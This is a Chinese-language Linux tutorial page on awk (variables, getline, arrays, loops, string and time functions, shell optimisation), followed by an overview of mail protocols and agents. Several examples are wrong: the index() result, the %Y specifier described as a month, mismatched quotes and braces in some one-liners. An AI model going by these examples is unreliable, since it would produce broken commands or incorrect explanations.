ARGIND      命令行中当前文件的位置(从0开始算)。
ARGV        包含命令行参数的数组。
CONVFMT     数字转换格式(默认值为%.6g)
ENVIRON     环境变量关联数组。
ERRNO       最后一个系统错误的描述。
FIELDWIDTHS 字段宽度列表(用空格键分隔)。
FILENAME    当前文件名。
FNR         同NR,但相对于当前文件。
FS          字段分隔符(默认是任何空格)。
IGNORECASE  如果为真,则进行忽略大小写的匹配。
NF          当前记录中的字段数。
NR          当前记录数。
OFMT        数字的输出格式(默认值是%.6g)。
OFS         输出字段分隔符(默认值是一个空格)。
ORS         输出记录分隔符(默认值是一个换行符)。
RLENGTH     由match函数所匹配的字符串的长度。
RS          记录分隔符(默认是一个换行符)。
RSTART      由match函数所匹配的字符串的第一个位置。
SUBSEP      数组下标分隔符(默认值是\034)。

【awk运算符】
= += -= *= /= %= ^= **=  赋值
?:                       C条件表达式
||                       逻辑或
&&                       逻辑与
~      ~!                匹配正则表达式和不匹配正则表达式
< <= > >= != ==          关系运算符
空格                     连接
+ -                      加,减
* / &                    乘,除与求余
+ - !                    一元加,减和逻辑非
^ ***                    求幂
++ --                    增加或减少,作为前缀或后缀
$                        字段引用
in                       数组成员

【记录】
awk把每一个以换行符结束的行称为一个记录。

记录分隔符:默认的输入和输出的分隔符都是回车,保存在内建变量ORS和RS中。

$0变量:它指的是整条记录。如$ awk '{print $0}' test将输出test文件中的所有记录。

变量NR:一个计数器,每处理完一条记录,NR的值就增加1。如$ awk '{print NR,$0}' test
将输出test文件中所有记录,并在记录前显示记录号。

【域】
记录中每个单词称做"域",默认情况下以空格或tab分隔。awk可跟踪域的个数,并在内建变量NF中保存该值。如$ awk '{print $1,$3}' test将打印test文件中第一和第三个以空格分开的列(域)。

【域分隔符】
内建变量FS保存输入域分隔符的值,默认是空格或tab。我们可以通过-F命令行选项修改FS的值。如$ awk -F: '{print $1,$5}' test将打印以冒号为分隔符的第一,第五列的内容。

可以同时使用多个域分隔符,这时应该把分隔符写成放到方括号中,如$awk -F'[:\t]' '{print $1,$3}' test,表示以空格、冒号和tab作为分隔符。

输出域的分隔符默认是一个空格,保存在OFS中。如$ awk -F: '{print $1,$5}' test,$1和$5间的逗号就是OFS的值


【一个验证passwd文件有效性的例子】
$ cat /etc/passwd | awk -F: '\
NF != 7{\
printf("line %d,does not have 7 fields:%s\n",NR,$0)}\
$1 !~ /[A-Za-z0-9]/{printf("line %d,non alpha and numeric user id:%d: %s\n,NR,$0)}\
$2 == "*" {printf("line %d, no password: %s\n",NR,$0)}'

cat把结果输出给awk,awk把域之间的分隔符设为冒号。
如果域的数量(NF)不等于7,就执行下面的程序。
printf打印字符串"line ?? does not have 7 fields",并显示该条记录。
如果第一个域没有包含任何字母和数字,printf打印"no alpha and numeric user id" ,并显示记录数和记录。
如果第二个域是一个星号,就打印字符串"no passwd",紧跟着显示记录数和记录本身。

【重定向和管道】
awk可使用shell的重定向符进行重定向输出
如:$ awk '$1 = 100 {print $1 > "output_file" }' test
上式表示如果第一个域的值等于100,则把它输出到output_file中。也可以用>>来重定向输出,但不清空文件,只做追加操作。

输出重定向需用到getline函数。getline从标准输入、管道或者当前正在处理的文件之外的其他输入文件获得输入。它负责从输入获得下一行的内容,并给NF,NR和FNR等内建变量赋值。如果得到一条记录,getline函数返回1,如果到达文件的末尾就返回0,如果出现错误,例如打开文件失败,就返回-1。如:

$ awk 'BEGIN{ "date" | getline d; print d}' test
执行linux的date命令,并通过管道输出给getline,然后再把输出赋值给自定义变量d,并打印它。

$ awk 'BEGIN{"date" | getline d; split(d,mon); print mon[2]}' test
执行shell的date命令,并通过管道输出给getline,然后getline从管道中读取并将输入赋值给d,split函数把变量d转化成数组mon,然后打印数组mon的第二个元素。

$ awk 'BEGIN{while( "ls" | getline) print}'
命令ls的输出传递给geline作为输入,循环使getline从ls的输出中读取一行,并把它打印到屏幕。这里没有输入文件,因为BEGIN块在打开输入文件前执行,所以可以忽略输入文件。

$ awk 'BEGIN{printf "What is your name?"; getline name < "/dev/tty" } $1 ~name {print "Found" name on line ", NR "."} END{print "See you," name "."} test
在屏幕上打印"What is your name?",并等待用户应答。当一行输入完毕后,getline函数从终端接收该行输入,并把它储存在自定义变量name中。如果第一个域匹配变量name的值,print函数就被执行,END块打印See you和name的值。

$ awk 'BEGIN{while(getline < "/etc/passwd" > 0) lc++; print lc}'
awk将逐行读取文件/etc/passwd的内容,在到达文件末尾前,计数器lc一直增加,当到末尾时,打印lc的值。注意,如果文件不存在,getline返回-1,如果到达文件的末尾就返回0,如果读到一行,就返回1,所以命令 while(getline < "/etc/passwd")在文件不存在的情况下将陷入无限循环,因为返回-1表示逻辑真。

可以在awk中打开一个管道,且同一时刻只能有一个管道存在。通过close()可关闭管道
如:$ awk '{print $1, $2 | "sort" }' test END {close("sort")}
awd把print语句的输出通过管道作为linux命令sort的输入,END块执行关闭管道操作

system函数可以在awk中执行linux的命令。如:$ awk 'BEGIN{system("clear")}'

fflush函数用以刷新输出缓冲区,如果没有参数,就刷新标准输出的缓冲区,如果以空字符串为参数,如fflush(""),则刷新所有文件和管道的输出缓冲区。

【使用NR和FNR的一些例子】
一般在awk里面输入文件是多个时,NR==FNR才有意义,如果这个值为true,表示还在处理第一个文件。

</pre><textarea>test.txt 10行内容
test2.txt 4行内容

awk '{print NR,FNR}' test.txt test2.txt
1 1
2 2
3 3
4 4
5 5
6 6
7 7
8 8
9 9
10 10
11 1
12 2
13 3
14 4

</textarea><textarea>现在有两个文件格式如下:
#cat account
张三|000001
李四|000002
#cat cdr
000001|10
000001|20
000002|30
000002|15

想要得到的结果是将用户名,帐号和金额在同一行打印出来,如下:
张三|000001|10
张三|000001|20
李四|000002|30
李四|000002|15

执行如下代码
#awk -F \| 'NR==FNR{a[$2]=$0;next}{print a[$1]"|"$2}' account cdr

注释:
由NR=FNR为真时,判断当前读入的是第一个文件account,然后使用{a[$2]=$0;next}循环将account文件的每行记录都存入数组a,并使用$2第2个字段作为下标引用.

由NR=FNR为假时,判断当前读入了第二个文件cdr,然后跳过{a[$2]=$0;next},对第二个文件cdr的每一行都无条件执行{print a[$1]"|"$2},此时变量$1为第二个文件的第一个字段,与读入第一个文件时,采用第一个文件第二个字段$2为数组下标相同.因此可以在此使用a[$1]引用数组。

awk '{gsub(/\$/,"");gsub(/,/,"");
if($1>=0.1 && $1 < 0.2) c1+=1;
else if($1>=0.2 && $1 < 0.3) c2+=1;
else if($1>=0.3 && $1 < 0.4) c3+=1;
else if($1>=0.4 && $1 < 0.5) c4+=1;
else if($1>=0.5 && $1 < 0.6) c5+=1;
else if($1>=0.6 && $1 < 0.7) c6+=1;
else if($1>=0.7 && $1 < 0.8) c7+=1;
else if($1>=0.8 && $1 < 0.9) c8+=1;
else if($1>=0.9 ) c9+=1;
else c10+=1; }
END {printf "%d\t%d\t%d\t%d\t%d\t%d\t%d\t%d\t%d\t%d\t",c1,c2,c3,c4,c5,c6,c7,c8,c9,c10} ' /NEW

示例/例子:
awk '{if($0~/^>.*$/) {tmp=$0; getline; if( length($0)>=200) {print tmp"\n"$0; } }}' filename

awk '{if($0~/^>.*$/) {IGNORECASE=1; if($0~/PREDICTED/) {getline;} else {print $0; getline; print $0; } }}' filename

awk '{if($0~/^>.*$/) {IGNORECASE=1; if($0~/mRNA/) {print $0; getline; print $0; } else {getline;} }}' filename

awk '{ temp=$0; getline; if($0~/unavailable/) {;} else {print temp"\n"$0;} }' filename

substr($4,20) ---> 表示是从第4个字段里的第20个字符开始,一直到设定的分隔符","结束.

substr($3,12,8) ---> 表示是从第3个字段里的第12个字符开始,截取8个字符结束.

</textarea><pre>
一、awk字符串转数字
$ awk 'BEGIN{a="100";b="10test10";print(a+b+0);}'   // 110
只需要将变量通过"+"连接运算。自动强制将字符串转为整型。非数字变成0,发现第一个非数字字符,后面自动忽略。
二、awk数字转为字符串
$ awk 'BEGIN{a=100;b=100;c=(a""b);print c}'          // 100100
只需要将变量与"符号连接起来运算即可。
三、awk字符串连接操作(字符串连接;链接;串联)
$ awk 'BEGIN{a="a";b="b";c=(a""b);print c}'
ab
$ awk 'BEGIN{a="a";b="b";c=(a+b);print c}'
0

把文件中的各行串联起来:
awk 'BEGIN{xxxx="";}{xxxx=(xxxx""$0);}END{print xxxx}' temp.txt
awk 'BEGIN{xxxx="";}{xxxx=(xxxx"\",\""$0);}END{print xxxx}' temp.txt

awk-for循环简单用法
$ cat sshd.txt |awk '{for(i=1;i<=NF;i++){print $i}}'

如何把一行竖排的数据转换成横排？
awk '{printf("%s,",$1)}' filename

</pre>

<h4>awk变量</h4><pre>
在awk中,变量不需要定义就可以直接使用,变量类型可以是数字或字符串。

赋值格式:Variable = expression
如$ awk '$1 ~/test/{count = $2 + $3; print count}' test
上式的作用是,awk先扫描第一个域,一旦test匹配,就把第二个域的值加上第三个域的值,并把结果赋值给变量count,最后打印出来。

awk可以在命令行中给变量赋值,然后将这个变量传输给awk脚本。如$ awk -F: -f awkscript month=4 year=2004 test,上式的month和year都是自定义变量,分别被赋值为4和2004。在awk脚本中,这些变量使用起来就象是在脚本中建立的一样。注意,如果参数前面出现test,那么在BEGIN语句中的变量就不能被使用。

域变量也可被赋值和修改
如$ awk '{$2 = 100 + $1; print }' test,上式表示,如果第二个域不存在,awk将计算表达式100加$1的值,并将其赋值给$2,如果第二个域存在,则用表达式的值覆盖$2原来的值
再例如:$ awk '$1 == "root"{$1 ="test";print}' test,如果第一个域的值是"root",则把它赋值为"test",注意,字符串一定要用双引号。

【内建变量的使用】
内置变量来保存某些频繁使用的数量

$ awk -F: '{IGNORECASE=1; $1 == "MARY"{print NR,$1,$2,$NF}'test
把IGNORECASE设为1代表忽略大小写,打印第一个域是mary的记录数、第一个域、第二个域和最后一个域。

awk内置变量
awk有许多内置变量用来设置环境信息,这些变量可以被改变,下面给出了最常用的一些变量。
ARGC               命令行参数个数
ARGV               命令行参数排列
ENVIRON            支持队列中系统环境变量的使用
FILENAME           awk浏览的文件名
FNR                浏览文件的记录数
FS                 设置输入域分隔符,等价于命令行 -F选项
NF                 浏览记录的域的个数
NR                 已读的记录数
OFS                输出域分隔符
ORS                输出记录分隔符
RS                 控制记录分隔符
此外,$0变量是指整条记录。$1表示当前行的第一个域,$2表示当前行的第二个域,以此类推

统计/etc/passwd:文件名,每行的行号,每行的列数,对应的完整行内容:
#awk  -F ':'  '{print "filename:" FILENAME ",linenumber:" NR ",columns:" NF ",linecontent:"$0}' /etc/passwd
filename:/etc/passwd,linenumber:1,columns:7,linecontent:root:x:0:0:root:/root:/bin/bash
filename:/etc/passwd,linenumber:2,columns:7,linecontent:daemon:x:1:1:daemon:/usr/sbin:/bin/sh
filename:/etc/passwd,linenumber:3,columns:7,linecontent:bin:x:2:2:bin:/bin:/bin/sh
filename:/etc/passwd,linenumber:4,columns:7,linecontent:sys:x:3:3:sys:/dev:/bin/sh

使用printf替代print,可以让代码更加简洁,易读
awk  -F ':'  '{printf("filename:%10s,linenumber:%s,columns:%s,linecontent:%s\n",FILENAME,NR,NF,$0)}' /etc/passwd

【awk自定义变量】
除了awk的内置变量,awk还可以自定义变量,用于计算、存储数据诸如此类的操作
awk中用户创建的变量不需要声明

下面统计/etc/passwd的账户人数
awk '{count++;print $0;} END{print "user count is ", count}' /etc/passwd
root:x:0:0:root:/root:/bin/bash
......
user count is  40
count是自定义变量。之前的action{}里都是只有一个print,其实print只是一个语句,而action{}可以有多个语句,以;号隔开。

这里没有初始化count,虽然默认是0,但是妥当的做法还是初始化为0:
awk 'BEGIN {count=0;print "[start]user count is ", count} {count=count+1;print $0;} END{print "[end]user count is ", count}' /etc/passwd
[start]user count is  0
root:x:0:0:root:/root:/bin/bash
...
[end]user count is  40

统计某个文件夹下的文件占用的字节数
ls -l |awk 'BEGIN {size=0;} {size=size+$5;print $0;} END{print "[end]size is ", size}'

如果以M为单位显示:
ls -l |awk 'BEGIN {size=0;} {size=size+$5;;print $0;} END{print "[end]size is ", size/1024/1024,"M"}'
[end]size is  8.25889 M
注意,统计不包括文件夹的子目录。

</pre>

<h4>数组</h4><pre>
awk的数组存储了一组相关的值

因为awk中数组的下标可以是数字和字母,称为关联数组
数组的下标通常被称为关键字(key)。值和关键字都存储在内部的一张针对key/value应用hash的表格里。由于hash不是顺序存储,因此在显示数组内容时会发现,它们并不是按照预料的顺序显示出来的。数组和变量一样,都是在使用时自动创建的,awk也同样会自动判断其存储的是数字还是字符串。一般而言,awk中的数组用来从记录中收集信息,可以用于计算总和、统计单词以及跟踪模板被匹配的次数等等。

下标与关联数组

用变量作为数组下标。如:$ awk {name[x++]=$2};END{for(i=0;i< NR;i++) print i,name[i]}' test。数组name中的下标是一个自定义变量x,awk初始化x的值为0,在每次使用后增加1。第二个域的值被赋给name数组的各个元素。在END模块中,for循环被用于循环整个数组,从下标为0的元素开始,打印那些存储在数组中的值。因为下标是关健字,所以它不一定从0开始,可以从任何值开始。

special for 循环用于读取关联数组中的元素。格式如下:

{
  for(item in arrayname){
    print arrayname[item]
  }
}
$ awk '/^tom/{name[NR]=$1}; END{for(i in name){print name[i]}}' test。打印有值的数组元素。打印的顺序是随机的。
用字符串作为下标。如:count["test"]

用域值作为数组的下标。一种新的for循环方式,for(index_value in array) statement
如:$ awk '{count[$1]++} END{for(name in count) print name,count[name]}' test
该语句将打印$1中字符串出现的次数。它首先以第一个域作数组count的下标,第一个域变化,索引就变化。

delete 函数用于删除数组元素
如:$ awk '{line[x++]=$1} END{for(x in line) delete(line[x])}' test
分配给数组line的是第一个域的值,所有记录处理完成后,special for循环将删除每一个元素。

显示/etc/passwd的账户,这里使用for循环遍历数组
awk -F ':' 'BEGIN {count=0;} {name[count] = $1;count++;}; END{for(i = 0; i < NR; i++) print i, name[i]}' /etc/passwd
0 root
1 daemon
2 bin
3 sys
4 sync
5 games
......

</pre><textarea>需求:分析apace日志,获取访问量较大的前十个IP地址

方法: awk '{ips[$1]++;}END{for(ip in ips)print ip,ips[ip]}' |sort –nk2|head -10

实例结果分析:该apace日志首列保存ip信息。能过awk对日志进行一次遍历,即实现了IP信息的获取,同时采用了哈希结构,对ip进行了累计

</textarea><textarea># 反转 - 按行逆序打印输入
    { line[NR] = $0 }  # 记下每个输入行
END { i = NR           # 逆序打印
      while(i > 0) {
        print line[i]
        i = i - 1
      }
    }

</textarea>

<h4>条件语句 循环语句</h4><pre>
【条件语句】
awk中的条件语句是从C语言中借鉴来的,见如下声明方式:
if(expression) {
    statement;
    statement;
    ... ...
}

if(expression) {
    statement;
} else {
    statement2;
}

if(expression) {
    statement1;
} else if(expression1) {
    statement2;
} else {
    statement3;
}

统计某个文件夹下的文件占用的字节数,过滤4096大小的文件(一般都是文件夹):
ls -l |awk 'BEGIN {size=0;print "[start]size is ", size} {if($5!=4096){size=size+$5;}} END{print "[end]size is ", size/1024/1024,"M"}'
[end]size is  8.22339 M

$ awk '{if($1 <$2) print $2 "too high"}'     // test。如果第一个域小于第二个域则打印。
$ awk '{if($1 < $2) {count++; print "ok"}}'  // test.如果第一个域小于第二个域,则count加一,并打印ok

$ awk '{if($1 > 100) print $1 "bad" ; else print "ok"}' test。如果$1大于100则打印$1 bad,否则打印ok。
$ awk '{if($1 > 100){ count++; print $1} else {count--; print $2}' test。如果$1大于100,则count加一,并打印$1,否则count减一,并打印$1。

awk -F: '{if($1 == "root") print $1;else if($1 == "seker") print $6;else if($1 == "zorro") print $7;else print NR}' /etc/passwd

</pre><textarea>将计算时薪超过6美元的员工的总薪酬与平均薪酬。它使用一个 if 来防范计算平均薪酬时的零除问题。
$2 > 6 { n = n + 1; pay = pay + $2 * $3 }
END    { if(n > 0)
            print n, "employees, total pay is", pay,
                     "average pay is", pay/n
         else
             print "no employees are paid more than $6/hour"
        }
可以使用一个逗号将一个长语句截断为多行来书写

</textarea><pre>
【三元表达式】
条件 ? 动作1 : 动作2
expr?action1:action2

$ awk -F: 'var=($3 >= 500)?$1:"system_user" {print $1"\t"$3"\t"var}' /etc/passwd
$ awk -F: '{print($3>500?$1:$2)}' /etc/passwd

【循环语句】
awk中的循环语句同样借鉴于C语言,支持while、do/while、for、break、continue,这些关键字的语义和C语言中的语义完全相同。
awk有三种循环: while循环;for循环;special for循环。

$ awk '{ i = 1; while( i <= NF ) { print NF,$i; i++}}' test。变量的初始值为1,若i小于可等于NF(记录中域的个数),则执行打印语句,且i增加1。直到i的值大于NF.

$ awk '{for(i = 1; i< NF; i++) print NF,$i}' test。作用同上。

bread continue 语句。
break用于在满足条件的情况下跳出循环;continue用于在满足条件的情况下忽略后面的语句,直接返回循环的顶端。如:

{
  for( x=3; x<=NF; x++)
  if($x< 0){print "Bottomed out!"; break}
}
{
  for( x=3; x<=NF; x++)
  if($x==0){print "Get next item"; continue}
}

next 语句从输入文件中读取一行,然后从头开始执行awk脚本。如:

{if($1 ~/test/){next}
    else {print}
}

exit 语句用于结束awk程序,但不会略过END块。退出状态为0代表成功,非零值表示出错。

</pre><textarea># interest1 - 计算复利
#   输入: 钱数    利率    年数
#   输出: 复利值

# while
{   i = 1
    while(i <= $3) {
        printf("\t%.2f\n", $1 *(1 + $2) ^ i)
        i = i + 1
    }
}

# for
{ for(i = 1; i <= $3; i = i + 1)
    printf("\t%.2f\n", $1 *(1 + $2) ^ i)
}

# 执行
$ awk -f interest1
1000 .06 5
        1060.00
        1123.60
        1191.02
        1262.48
        1338.23
1000 .12 5
        1120.00
        1254.40
        1404.93
        1573.52
        1762.34

</textarea>

<h4>awk的内建函数</h4><pre>
【awk的内建函数之字符串函数】
1、sub函数匹配记录中最大、最靠左边的子字符串的正则表达式,并用替换字符串替换这些字符串。如果没有指定目标字符串就默认使用整个记录。替换只发生在第一次匹配的时候。格式如下:
sub(regular expression, substitution string):
sub(regular expression, substitution string, target string)

实例:
$ awk '{ sub(/test/, "mytest"); print }' testfile
$ awk '{ sub(/test/, "mytest"); $1}; print }' testfile
第一个例子在整个记录中匹配,替换只发生在第一次匹配发生的时候。如要在整个文件中进行匹配需要用到gsub
第二个例子在整个记录的第一个域中进行匹配,替换只发生在第一次匹配发生的时候。

2、gsub 函数作用如sub,但它在整个文档中进行匹配。格式如下:
gsub(regular expression, substitution string)
gsub(regular expression, substitution string, target string)

实例:
$ awk '{ gsub(/test/, "mytest"); print }' testfile
$ awk '{ gsub(/test/, "mytest" , $1) }; print }' testfile
第一个例子在整个文档中匹配test,匹配的都被替换成mytest。
第二个例子在整个文档的第一个域中匹配,所有匹配的都被替换成mytest。

3、index 函数返回子字符串第一次被匹配的位置,偏移量从位置1开始。格式如下:
index(string, substring)

实例:
$ awk '{ print index("test", "mytest") }' testfile
实例返回test在mytest的位置,结果应该是3。

4、length 函数返回记录的字符数。格式如下:
length( string )

实例:
$ awk '{ print length( "test" ) }'
$ awk '{ print length }' testfile
第一个实例返回test字符串的长度。
第二个实例返回testfile文件中第条记录的字符数。

{ print $1, length($1) }  # 计算每个人的姓名的长度

5、substr 函数返回从位置1开始的子字符串,如果指定长度超过实际长度,就返回整个字符串。格式如下:
substr( string, starting position )
substr( string, starting position, length of string )

实例:
$ awk '{ print substr( "hello world", 7,11 ) }'
上例截取了world子字符串。

6、match 函数返回在字符串中正则表达式位置的索引,如果找不到指定的正则表达式则返回0。match函数会设置内建变量RSTART为字符串中子字符串的开始位置,RLENGTH为到子字符串末尾的字符个数。substr可利于这些变量来截取字符串。函数格式如下:
match( string, regular expression )

实例:
$ awk '{start=match("this is a test",/[a-z]+$/); print start}'
$ awk '{start=match("this is a test",/[a-z]+$/); print start, RSTART, RLENGTH }'
第一个实例打印以连续小写字符结尾的开始位置,这里是11。
第二个实例还打印RSTART和RLENGTH变量,这里是11(start),11(RSTART),4(RLENGTH)。

7、toupper 和tolower 函数可用于字符串大小间的转换,该功能只在gawk中有效。格式如下:
toupper( string )
tolower( string )

实例:
$ awk '{ print toupper("test"), tolower("TEST") }'

8、split 函数可按给定的分隔符把字符串分割为一个数组。如果分隔符没提供,则按当前FS值进行分割。格式如下:
split( string, array, field separator )
split( string, array )

实例:
$ awk '{ split( "20:18:00", time, ":" ); print time[2] }'
上例把时间按冒号分割到time数组内,并显示第二个数组元素18。

【awk的内建函数之时间函数】
1、systime()函数返回从1970年1月1日开始到当前时间(不计闰年)的整秒数。格式如下:

实例:
$ awk '{ now = systime(); print now }'

2、strftime函数使用C库中的strftime函数格式化时间。格式如下:
systime( [format specification][,timestamp] )

日期和时间格式说明符
%a  星期几的缩写(Sun)
%A  星期几的完整写法(Sunday)
%b  月名的缩写(Oct)
%B  月名的完整写法(October)
%c  本地日期和时间
%d  十进制日期
%D  日期 08/20/99
%e  日期,如果只有一位会补上一个空格
%H  用十进制表示24小时格式的小时
%I  用十进制表示12小时格式的小时
%j  从1月1日起一年中的第几天
%m  十进制表示的月份
%M  十进制表示的分钟
%p  12小时表示法(AM/PM)
%S  十进制表示的秒
%U  十进制表示的一年中的第几个星期(星期天作为一个星期的开始)
%w  十进制表示的星期几(星期天是0)
%W  十进制表示的一年中的第几个星期(星期一作为一个星期的开始)
%x  重新设置本地日期(08/20/99)
%X  重新设置本地时间(12:00:00)
%y  两位数字表示的年(99)
%Y  当前月份
%Z  时区(PDT)
%%  百分号(%)

实例:
$ awk '{ now=strftime( "%D", systime() ); print now }'     // 06/20/18
$ awk '{ now=strftime("%m/%d/%y"); print now }'            // 06/20/18

【awk的内建函数之数学函数】
函数名称  返回值
atan2(x,y) y,x范围内的余切
cos(x)     余弦函数
exp(x)     求幂
int(x)     取整
log(x)     自然对数
sin(x)     正弦
sqrt(x)    平方根
srand(x)   x是rand()函数的种子
int(x)     取整,过程没有舍入
rand()     产生一个大于等于0而小于1的随机数

【自定义函数】
在awk中还可自定义函数,格式如下:

function name( parameter, parameter, parameter, ... ) {
  statements
  return expression                  # the return statement and expression are optional
}

</pre>

<h4>shell优化与awk</h4><pre>
作为解释型的脚本语言,天生就有效率上边的缺陷。尽管它调用的其他命令可能效率上是不错的。
Shell脚本程序的执行是顺序执行,而非并行执行的。这很大程度上浪费了可能能利用上的系统资源。
Shell每执行一个命令就创建一个新的进程,如果脚本编写者没有这方面意识,编写脚本不当的话,是非常浪费系统资源的。

循环处理数据,程序尽量使用awk来做循环操作
</pre><textarea>sum=0
for((i=0;i < 100000;i++)
do
sum=$(($sum+$i)
done
echo $sum

4999950000
real    0m2.046s
user    0m1.922s
sys     0m0.016s

</textarea><textarea>awk 'BEGIN{
  sum=0;
  for(i=0;i < 100000;i++)
  sum=sum+i;
  print sum;
}'

4999950000
real    0m0.672s
user    0m0.031s
sys     0m0.125s

</textarea><pre>
关于正则

有一个1694617行的日志文件 action.log,它的内容类似:
2012_02_07 00:00:04 1977575701 183.10.69.47 login 500004 1977575701 old /***/port/***.php?…

现在想获取//之间的port的字符串,可以这样:
awk -F'/' '{print $3}' < 7action.log > /dev/null
real 0m12.296s
user 0m12.033s
sys 0m0.262s

awk '{print $9}' < 7action.log | awk -F'/' '{print $3}' > /dev/null
real 0m3.691s
user 0m5.219s
sys 0m0.630s

因为正则每次运行都是需要启动字符串匹配的,而且默认的分隔符会较快的按字段区分出。所以在知道一些数据规律之后可以尝试大幅度的缩短将要进行复杂正则匹配的字符串,这样会根据缩减数据规模有一个非常明显的效率提升
上边还是验证的比较简单的正则匹配情况,只有一个单字符"\",可以试想如果正则表达式是这样:
$7!~/\.jpg$/&&$7~/\.[s]?html|\.php|\.xml|\/$/&&($9==200||$9==304)&&$1!~/^103\.108|^224\.215|^127\.0|^122\.110\.5/

shell的重定向和管道
很多程序或者语言都有一个比较突出的效率瓶颈就是IO,所以建议尽可能的少用重定向来进行输入输出这样的操作或者创建临时文件来供后续使用
可以用Shell提供的管道来实现命令间数据的传递。如果进行连续的对数据进行过滤性命令的时候,尽量把一次性过滤较多的命令放在前边,以减少数据传递规模。
连管道也尽量的少用的,虽然管道比正常的同定向IO快几个数量级的样子,但是那也是需要消耗额外的资源的,好好设计代码来减少这个开销吧。比如sort | uniq命令,完全可以使用sort -u来实现

5、关于对shell命令的理解
比如:sed -n '45,50p' 和 sed -n '51q;45,50p' ,前者也是读取45到50行,后者也是,但是后者到51行就执行了退出sed命令,避免了后续的操作读取。如果这个目标文件的规模巨大的话,剩下的你懂的。
还有类似sed 's/foo/bar/g' 和sed '/foo/ s/foo/bar/g'
sed支持采用正则进行匹配和替换,考虑字符串替换的需求中,不防加上地址以提高速度。实例中通过增加一个判断逻辑,采用"事先匹配"代替"直接替换",由于sed会保留前一次的正则匹配环境,不会产生冗余的正则匹配,因此后者具有更高的效率。关于sed命令的这两点优化,我也在sed命令详解里有提到。

还有类似sort 如果数字尽量用 -n选项;还有统计文件行数,如果每行的数据在占用字节数一样的情况时就可以ls查文件大小然后除以每行的数据大小的出行数,而避免直接使用wc -l这样的命令;还有find出来的数据,别直接就-exec选项了,如果数据规模小很好,但是如果你find出来上千条数据或更多,你会疯掉的,不,系统会疯掉的,因为每行数据都会产生新的进程,你可以这样find …. | xargs ….

</pre>
</div>

<div id="mail">
<h3>mail</h3><pre>
发送邮件的两种方式:
1.连接现成的smtp服务器去发送,此方法比较简单,直接利用现有的smtp服务器比如qq、新浪、网易等邮箱,只需要直接配置mail.rc文件即可实现
2.自己搭建私有的smtp服务器,需要用到postfix、bind等服务

【 邮件相关协议 】
SMTP(Simple Mail Transfer Protocol)即简单邮件传输协议,工作在TCP的25端口。它是一组用于由源地址到目的地址传送邮件的规则,由它来控制信件的中转方式。跟名字一样smtp非常简单,无法做到认证,邮件存放等功能。
MUA连接MTA或MTA连接MTA发送邮件使用此协议

POP3(Post Office Protocol)邮局协议第3版,工作在TCP的110端口。本协议主要用于支持使用客户端远程管理在服务器上的电子邮件。POP协议支持"离线"邮件处理。其具体过程是:邮件发送到服务器上,电子邮件客户端调用邮件客户机程序以连接服务器,并下载所有未阅读的电子邮件。这种离线访问模式是一种存储转发服务,将邮件从邮件服务器端送到个人终端机器上,一般是PC机或MAC。一旦邮件发送到PC机或MAC上,邮件服务器上的邮件将会被删除。但目前的POP3邮件服务器大都可以"只下载邮件,服务器端并不删除",也就是改进的POP3协议。
用于MUA连接服务器收取用户邮件

IMAP4(Internet Mail Access Protocol)因特网邮件访问协议第4版,工作在TCP的143端口。IMAP4协议与POP3协议一样也是规定个人计算机如何访问网上的邮件的服务器进行收发邮件的协议,但是IMAP4协议同POP3协议相比更高级。IMAP4支持协议客户机在线或离开访问并阅读服务器上的邮件,还能交互式的操作服务器上的邮件。IMAP4协议更人性化的地方是不需要像POP3协议那样把邮件下载到本地,用户可以通过客户端直接对服务器上的邮件进行操作(在线阅读邮件、在线查看邮件主题、大小、发件地址等信息)。用户还可以在服务器上维护(移动)自己邮件目录、新建删除重命名共享抓取文本等操作。IMAP4协议弥补了POP3协议的很多缺陷。

【 邮件相关名词 】
一般情况下把电子邮件程序分解成传输代理,投递代理和用户代理
用户代理接受用户的指令,将用户的信件传送至信件传输代理,投递代理则从信件传输代理取得信件传送至最终用户的邮箱.当用户试图发送一封电子邮件的时候,他并不能直接将信件发送到对方的机器上,用户代理必须试图去寻找一个信件传输代理,把邮件提交给它。信件传输代理得到了邮件后,首先将它保存在自身的缓冲队列中,然后根据邮件的目标地址,信件传输代理程序将找到应该对这个目标地址负责的邮件传输代理服务器, 并且通过网络将邮件传送给它。对方的服务器接收到邮件之后,将其缓冲存储在本地,直到电子邮件的接收者查看自己的电子信箱。

1)MTA(Mail Transfer Agent)
邮件传输代理工具,即邮件服务器(如qq、sina),用于转发、收取邮件,通过SMTP协议所指定的服务器就可以把E-mail寄到收信人的服务器上了,整个过程只要几分钟。SMTP服务器则是遵循SMTP协议的发送邮件服务器,用来发送或中转发出的电子邮件。常用的MTA有:
SendMail:邮件的鼻祖。
Qmail:一个数学家开发,作为Linux下面主流的邮件系统内核,大量著名的商业邮件系统都是在Qmail内核下开发,比如Hotmail。
Postfix:IBM安全专家开发,模块化设计,并且比sendmail兼容效率更高。
Exim:是基于GPL协议的开放源代码软件,由英国剑桥大学的Philip Hazel开发。
Exchange:微软公司的一套电子邮件服务组件,是个消息与协作系统。

MTA用于向收件人的目标agent发送邮件和接收来自其他agent的邮件,使用Postfix作为MTA,它比sendmail更安全高效,且在Ubuntu平台上官方源提供更新
apt-get install postfix

2)MDA(Mail Delivery Agent)
邮件投递代理,投递代理则从信件传输代理取得信件传送至最终用户的邮箱,负责MTA接受到邮件后的进一步处理,用于过滤垃圾邮件。常用的MDA有:
ProcMail:Postfix默认的邮件投递工具。
MailDrop:相对比较专业的投递代理工具。

3)MRA(Mail Retrieval Agent)
邮件取回代理,使用POP3或IMAP4协议工作。一般用于从用户信箱取回邮件到邮件用户代理客户端。常用的MRA有:
Dovecot:是一个开源的支持IMAP和POP3协议的收邮件服务器(自带SASL功能)

Dovecot和Courier是两个非常受欢迎的优秀的IMAP/POP3协议的服务器软件,Dovecot更加的轻量并且易于配置
postfix不带pop3和imap,使用Dovecot作为MDA,它在Ubuntu平台上也是官方源提供更新
apt-get install dovecot-common dovecot-imapd dovecot-pop3d

4)MUA(Mail User Agent)
邮件用户代理工具,即用户使用的写信、收信客户端软件。常用的MUA有:
OE:Windows旧版本自带的工具。
Outlook:Office套件带的工具。
FoxMail:腾讯公司的邮件客户端工具。
Thunderbird:雷鸟是Linux下的客户端工具。
Mutt:Linux下的字符界面客户端工具。

5)WebMail
基于Web的电子邮件收发系统,扮演邮件用户代理角色,一般WebMail系统提供邮件收发、用户在线服务和系统服务管理等功能。WebMail的界面直观、友好,不需要借助客户端,免除了用户对E-mail客户软件如Foxmail、Outlook等进行配置时的麻烦,只要能上网就能使用WebMail,方便用户对邮件进行接收和发送。WebMail使得E-mail在Internet上的应用广泛。常用的Webmail有:
Openwebmail:台湾开发的。
